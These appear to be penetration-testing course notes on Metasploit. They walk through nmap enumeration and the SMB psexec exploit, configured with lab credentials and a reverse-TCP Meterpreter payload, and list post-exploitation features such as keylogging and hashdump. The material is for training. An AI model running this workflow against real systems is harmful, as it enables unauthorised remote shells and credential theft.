# 07 — Automating Payloads & Delivery with Metasploit

## Overview

Metasploit is an automated attack framework developed by **Rapid7** that streamlines exploiting vulnerabilities through pre-built modules. It contains **2,000+ exploits** and **590+ payloads** ready to use.

> ⚠️ Metasploit makes exploitation easy, but you're responsible for understanding what it's doing. Using tools blindly in a live engagement can be destructive.

**Editions:**
- **Community Edition** — Free, included in Kali/Pwnbox
- **Metasploit Pro** — Paid, used by professional pentest firms (includes social engineering campaigns, advanced reporting)

---

## The Metasploit Workflow

```
1. Enumerate target (Nmap)
    ↓
2. Identify attack vector (e.g., SMB on port 445)
    ↓
3. Search for a module (search smb)
    ↓
4. Select the module (use <number>)
    ↓
5. Configure options (set RHOSTS, LHOST, credentials)
    ↓
6. Run it (exploit)
    ↓
7. Get a Meterpreter or system shell
```

---

## Starting Metasploit

```bash
sudo msfconsole
```

```
       =[ metasploit v6.0.44-dev                          ]
+ -- --=[ 2131 exploits - 1139 auxiliary - 363 post       ]
+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 8 evasion                                       ]
```

> Always run as root (`sudo`) — many modules need raw socket access.

---

## Finding a Module

### Step 1: Nmap scan to identify services

```bash
nmap -sC -sV -Pn 10.129.164.25
```

Example output:
```
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Microsoft Windows 7 - 10 microsoft-ds
```

Look for services + versions → pick an attack vector (SMB on 445).

### Step 2: Search Metasploit for matching modules

```
msf6 > search smb
```

Returns a table with columns: **#** (number), **Name**, **Disclosure Date**, **Rank**, **Check**, **Description**

> The number to the left is relative to your search — it may change. Use it with `use <number>` to quickly select a module.

---

## Understanding Module Naming

Example: `exploit/windows/smb/psexec`

| Part | Meaning |
|------|---------|
| `56` | Number assigned in search results (use `use 56` to select) |
| `exploit/` | Module type — this is an exploit module |
| `windows/` | Target platform |
| `smb/` | Target service / attack vector |
| `psexec` | The tool that gets uploaded to the target |

---

## Using a Module: SMB PSExec Example

### Select the module:

```
msf6 > use 56
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp

msf6 exploit(windows/smb/psexec) >
```

> MSF automatically assigns a default payload: `windows/meterpreter/reverse_tcp`

### View options:

```
msf6 exploit(windows/smb/psexec) > options
```

Shows two sections:
- **Module options** — Target settings (RHOSTS, credentials, share)
- **Payload options** — Callback settings (LHOST, LPORT)

### Configure required settings:

```
msf6 exploit(windows/smb/psexec) > set RHOSTS 10.129.180.71
msf6 exploit(windows/smb/psexec) > set SHARE ADMIN$
msf6 exploit(windows/smb/psexec) > set SMBUser htb-student
msf6 exploit(windows/smb/psexec) > set SMBPass HTB_@cademy_stdnt!
msf6 exploit(windows/smb/psexec) > set LHOST 10.10.14.222
```

| Option | What It Sets |
|--------|-------------|
| `RHOSTS` | Target IP (Remote Host) |
| `SHARE` | SMB share to upload payload to (`ADMIN$` = default admin share) |
| `SMBUser` | Username to authenticate with |
| `SMBPass` | Password for that user |
| `LHOST` | Your attack box IP (for the reverse connection) |
| `LPORT` | Your listening port (default 4444) |

### Run the exploit:

```
msf6 exploit(windows/smb/psexec) > exploit
```

### Successful output:

```
[*] Started reverse TCP handler on 10.10.14.222:4444
[*] 10.129.180.71:445 - Authenticating to 10.129.180.71:445 as user 'htb-student'...
[*] 10.129.180.71:445 - Selecting PowerShell target
[*] 10.129.180.71:445 - Executing the payload...
[*] Sending stage (175174 bytes) to 10.129.180.71
[*] Meterpreter session 1 opened

meterpreter >
```

---

## Meterpreter vs Regular Shell

Meterpreter is a **special payload** — not just a raw shell. It uses in-memory DLL injection to stay stealthy.

| Feature | Raw Shell | Meterpreter |
|---------|-----------|-------------|
| Run system commands | ✅ | ✅ |
| Upload/download files | Manual (certutil, curl) | ✅ Built-in (`upload` / `download`) |
| Keylogger | ❌ | ✅ (`keyscan_start`) |
| Screenshot | ❌ | ✅ (`screenshot`) |
| Process management | Manual | ✅ (`ps`, `migrate`) |
| Service control | Manual | ✅ (`create`, `start`, `stop`) |
| Hash dumping | Manual | ✅ (`hashdump`) |
| In-memory execution | ❌ | ✅ (no files on disk) |
| Drop to system shell | N/A | ✅ (`shell` command) |

### Drop from Meterpreter to a system shell:

```
meterpreter > shell

C:\WINDOWS\system32>
```

> Use `shell` when you need native OS commands that Meterpreter doesn't support.

### List all Meterpreter commands:

```
meterpreter > ?
```

---

## MSF Quick Reference

| Command | What It Does |
|---------|-------------|
| `search <term>` | Find modules by keyword |
| `use <module>` | Select a module |
| `options` | Show configurable settings |
| `set <option> <value>` | Configure a setting |
| `exploit` or `run` | Execute the module |
| `back` | Deselect current module |
| `sessions` | List active shell sessions |
| `sessions -i <id>` | Interact with a specific session |
| `shell` | Drop from Meterpreter to OS shell |
| `?` | List available commands |

---

## Key Takeaways

| Point | Detail |
|-------|--------|
| **Metasploit automates everything** | Module selection → payload delivery → shell — all handled |
| **Default payload** | `windows/meterpreter/reverse_tcp` — reverse shell with advanced features |
| **PSExec module** | Requires valid admin creds — uploads payload to ADMIN$ share |
| **Meterpreter is stealthy** | In-memory DLL injection, no files written to disk |
| **Always understand the module** | Read the description and options before running — don't be reckless |
| **LHOST matters** | Must be your VPN tunnel IP, not your local network IP |
| **Module numbers change** | The search result number is relative — don't memorize it |
| **PSExec cleans up** | This module auto-removes the service it creates (randomly named) |
